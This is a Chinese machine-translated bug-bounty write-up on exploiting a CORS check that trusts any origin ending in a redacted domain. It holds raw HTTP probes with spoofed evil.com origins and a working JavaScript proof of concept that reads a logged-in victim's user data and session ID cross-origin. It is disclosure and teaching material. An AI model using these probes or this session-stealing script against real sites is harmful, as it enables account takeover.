<html>
<head>
<title>Pre-domain wildcard CORS Exploitation</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">域名前通配符CORS利用</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/pre-domain-wildcard-cors-exploitation-2d6ac1d4bd30?source=collection_archive---------0-----------------------#2017-08-26">https://infosecwriteups.com/pre-domain-wildcard-cors-exploitation-2d6ac1d4bd30?source=collection_archive---------0-----------------------#2017-08-26</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><figure class="jv jw jx jy gt jz gh gi paragraph-image"><div role="button" tabindex="0" class="ka kb di kc bf kd"><div class="gh gi ju"><img src="../Images/1bb5174845b16c8b9b5654f23116a904.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IgKpd7xd6yQ9QSmf5jrajQ.jpeg"/></div></div></figure><p id="b4e7" class="pw-post-body-paragraph kg kh iq ki b kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld ij bi translated"><strong class="ki ir"> <em class="le">严重性:高</em> </strong></p><p id="3ad4" class="pw-post-body-paragraph kg kh iq ki b kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld ij bi translated"><strong class="ki ir"> <em class="le">复杂度:中等</em> </strong></p><p id="593d" class="pw-post-body-paragraph kg kh iq ki b kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld ij bi translated"><strong class="ki ir"> <em class="le">缺点:信任域名前通配符作为原点</em> </strong></p></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><ul class=""><li id="d46f" class="lf lg iq ki b kj kk kn ko kr lh kv li kz lj ld lk ll lm ln bi translated"><em class="le">一些网站在尝试验证来源是否可信时会犯典型的URL解析错误。</em></li></ul><p id="f887" class="pw-post-body-paragraph kg kh iq ki b kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld ij bi translated"><em class="le">例如，一个我称之为advisor.com的网站信任所有以advisor.com为终点的起点，包括definitelynotadvisor.com</em></p><ul class=""><li id="9fff" class="lf lg iq ki b kj kk kn ko kr lh kv li kz lj ld lk ll lm ln bi translated"><em class="le">以下是尝试寻找域名前通配符弱点的测试案例:</em></li></ul><p id="ff32" class="pw-post-body-paragraph kg kh iq ki b kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld ij bi translated"><strong class="ki ir"> <em class="le">称之为REDACTED.COM，因为它是Hackerone上的私人程序。</em> </strong></p></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><pre class="jv jw jx jy gt lo lp lq lr aw ls bi"><span id="2c03" class="lt lu iq lp b gy lv lw l lx ly">* TEST 1 :</span><span id="fe6e" class="lt lu iq lp b gy lz lw l lx ly">GET /account HTTP/1.1<br/>Host: connect.redacted.com<br/>Connection: close<br/>Upgrade-Insecure-Requests: 1<br/>User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8<br/>Referer: redacted.com<br/>Accept-Language: en-US,en;q=0.8<br/>Cookie: <br/>Origin: https://redacted.com</span><span id="dfa3" class="lt lu iq lp b gy lz lw l lx ly"><br/>* Response :</span><span id="43ec" class="lt lu iq lp b gy lz lw l lx ly">Access-Control-Allow-Credentials: true<br/>Access-Control-Allow-Headers: Accept, Accept-Encoding, Accept-Language, Authorization, X-Context, X-Session-ID<br/>Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS<br/>Access-Control-Allow-Origin: https://redacted.com<br/>Access-Control-Max-Age: 3600</span></pre></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><pre class="lo lp lq lr aw ls bi"><span id="4418" class="lt lu iq lp b gy ma mb mc md me lw l lx ly">Test 2 :</span><span id="44cf" class="lt lu iq lp b gy lz lw l lx ly">GET /account HTTP/1.1<br/>Host: connect.redacted.com<br/>Connection: close<br/>Upgrade-Insecure-Requests: 1<br/>User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8<br/>Referer: redacted.com<br/>Accept-Language: en-US,en;q=0.8<br/>Cookie: <br/>Origin: https://evil.com<br/></span><span id="9e1e" class="lt lu iq lp b gy lz lw l lx ly">* Response :</span><span id="d9f3" class="lt lu iq lp b gy lz lw l lx ly">HTTP/1.1 302 Found<br/>Content-Type: text/html;charset=utf-8<br/>Date: Wed, 23 Aug 2017 20:00:08 GMT<br/>Location: https://connect.redacted.com/auth</span></pre></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><pre class="lo lp lq lr aw ls bi"><span id="3887" class="lt lu iq lp b gy ma mb mc md me lw l lx ly">Test 3:</span><span id="3a03" class="lt lu iq lp b gy lz lw l lx ly">GET /account HTTP/1.1<br/>Host: connect.redacted.com<br/>Connection: close<br/>Upgrade-Insecure-Requests: 1<br/>User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8<br/>Referer: redacted.com<br/>Accept-Language: en-US,en;q=0.8<br/>Cookie: <br/>Origin: https://redacted.com.evil.com</span><span id="cbf6" class="lt lu iq lp b gy lz lw l lx ly">* Response :</span><span id="5bd8" class="lt lu iq lp b gy lz lw l lx ly">HTTP/1.1 302 Found<br/>Content-Type: text/html;charset=utf-8<br/>Date: Wed, 23 Aug 2017 20:00:08 GMT<br/>Location: https://connect.redacted.com/auth</span></pre></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><pre class="lo lp lq lr aw ls bi"><span id="d5cd" class="lt lu iq lp b gy ma mb mc md me lw l lx ly">Test 4:</span><span id="2abd" class="lt lu iq lp b gy lz lw l lx ly">GET /account HTTP/1.1<br/>Host: connect.redacted.com<br/>Connection: close<br/>Upgrade-Insecure-Requests: 1<br/>User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8<br/>Referer: redacted.com<br/>Accept-Language: en-US,en;q=0.8<br/>Cookie: <br/>Origin: https://connect.redacted.com.evil.com</span><span id="3eee" class="lt lu iq lp b gy lz lw l lx ly">* Response :</span><span id="6b5a" class="lt lu iq lp b gy lz lw l lx ly">HTTP/1.1 302 Found<br/>Content-Type: text/html;charset=utf-8<br/>Date: Wed, 23 Aug 2017 20:00:08 GMT<br/>Location: https://connect.redacted.com/auth</span></pre></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><pre class="lo lp lq lr aw ls bi"><span id="1872" class="lt lu iq lp b gy ma mb mc md me lw l lx ly">Test 5:</span><span id="e66c" class="lt lu iq lp b gy lz lw l lx ly">GET /account HTTP/1.1<br/>Host: connect.redacted.com<br/>Connection: close<br/>Upgrade-Insecure-Requests: 1<br/>User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8<br/>Referer: redacted.com<br/>Accept-Language: en-US,en;q=0.8<br/>Cookie: <br/>Origin: https://evilredacted.com</span><span id="6f44" class="lt lu iq lp b gy lz lw l lx ly">* Response :</span><span id="5f29" class="lt lu iq lp b gy lz lw l lx ly">Access-Control-Allow-Credentials: true<br/>Access-Control-Allow-Headers: Accept, Accept-Encoding, Accept-Language, Authorization, X-Context, X-Session-ID<br/>Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS<br/>Access-Control-Allow-Origin: https://evilredacted.com<br/>Access-Control-Max-Age: 3600</span></pre><ul class=""><li id="8f3a" class="lf lg iq ki b kj kk kn ko kr lh kv li kz lj ld lk ll lm ln bi translated"><em class="le">从</em> <strong class="ki ir"> <em class="le">测试5 </em> </strong> <em class="le">很明显，应用程序只是通过检查它是否以</em><strong class="ki ir"><em class="le">redacted.com</em></strong>结尾来验证原点</li><li id="eacf" class="lf lg iq ki b kj mf kn mg kr mh kv mi kz mj ld lk ll lm ln bi translated"><em class="le"> (ACAH)随着不同的方法也被启用，这意味着攻击者可以代表受害者提出不同的请求。</em></li><li id="080c" class="lf lg iq ki b kj mf kn mg kr mh kv mi kz mj ld lk ll lm ln bi translated"><em class="le">要成功利用这个漏洞，我们需要</em><strong class="ki ir"><em class="le">* redated . com域</em> </strong></li><li id="ce43" class="lf lg iq ki b kj mf kn mg kr mh kv mi kz mj ld lk ll lm ln bi translated"><em class="le">所以，我去买了它</em><strong class="ki ir"><em class="le">kiraakredacted.com</em></strong><em class="le">来剥削它</em></li></ul></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><ul class=""><li id="fc4f" class="lf lg iq ki b kj kk kn ko kr lh kv li kz lj ld lk ll lm ln bi translated"><strong class="ki ir"> <em class="le">剥削:</em> </strong></li></ul><p id="5b08" class="pw-post-body-paragraph kg kh iq ki b kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld ij bi translated"><em class="le">现在是时候找到好的剥削终点来论证&amp;增加影响了。connect.redacted.com的</em>  <em class="le">没有什么可利用的，就像静态网站要求安装他们的浏览器扩展一样。</em></p><p id="b490" class="pw-post-body-paragraph kg kh iq ki b kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld ij bi translated">但是有一件事让我一直想找到一些利用途径，那就是要安装那个扩展 <strong class="ki ir"> <em class="le">你需要登录。我怀疑他们在某个地方储存了一些信息。于是我开始了bruteforcing，阅读API端点的文档。并且遇到了</em><a class="ae mk" href="https://connect.redacted.com/v1/user" rel="noopener ugc nofollow" target="_blank"><strong class="ki ir"><em class="le">【https://connect.redacted.com/v1/user】</em></strong></a><strong class="ki ir"><em class="le"/></strong><em class="le">其中包含了json响应中的用户详细信息以及SESSIONID。</em></strong></p><pre class="jv jw jx jy gt lo lp lq lr aw ls bi"><span id="f6dc" class="lt lu iq lp b gy lv lw l lx ly">&lt;html&gt;<br/>&lt;body&gt;<br/>&lt;button type='button' onclick='cors()'&gt;xxx&lt;/button&gt;<br/>&lt;p id='demo'&gt;&lt;/p&gt;<br/>&lt;p id='session'&gt;&lt;/p&gt;<br/>&lt;script&gt;<br/>function cors() {<br/>var xhttp = new XMLHttpRequest();<br/>xhttp.onreadystatechange = function() {<br/>if (this.readyState == 4 &amp;&amp; this.status == 200) {<br/>document.getElementById("demo").innerHTML = this.responseText;<br/>parsed = JSON.stringify(this.responseText);<br/>var arr = [];<br/> for(var x in parsed){<br/> arr.push(parsed[x]);<br/> }<br/> console.log(arr)<br/> document.getElementById(‘session’).innerHTML = arr[13];<br/>}<br/>};<br/>xhttp.open("GET", "https://connect.redacted.com/v1/user", true);<br/>xhttp.withCredentials = true;<br/>xhttp.send();<br/>}<br/>&lt;/script&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;</span></pre><figure class="jv jw jx jy gt jz gh gi paragraph-image"><div role="button" tabindex="0" class="ka kb di kc bf kd"><div class="gh gi ml"><img src="../Images/01c3228b9e67fbb16123f93a8532de4a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AwqszgPq2ZEZkuElHVAZQA.png"/></div></div><figcaption class="mm mn gj gh gi mo mp bd b be z dk translated">反应</figcaption></figure><ul class=""><li id="efed" class="lf lg iq ki b kj kk kn ko kr lh kv li kz lj ld lk ll lm ln bi translated"><em class="le">能够远程接管用户账户。</em></li></ul></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><figure class="jv jw jx jy gt jz gh gi paragraph-image"><div role="button" tabindex="0" class="ka kb di kc bf kd"><div class="gh gi mq"><img src="../Images/12b6bdfda7e56f84aaae823a5656faa7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*j2Daty1NgBCG3uWv7TEmVA.png"/></div></div></figure><p id="edd1" class="pw-post-body-paragraph kg kh iq ki b kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld ij bi translated"><strong class="ki ir"> <em class="le">参考:</em> </strong></p><p id="39df" class="pw-post-body-paragraph kg kh iq ki b kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld ij bi translated"><a class="ae mk" href="http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html" rel="noopener ugc nofollow" target="_blank"><em class="le">http://blog . ports wigger . net/2016/10/exploining-CORS-misconfiguration s-for . html</em></a></p></div></div>    
</body>
</html>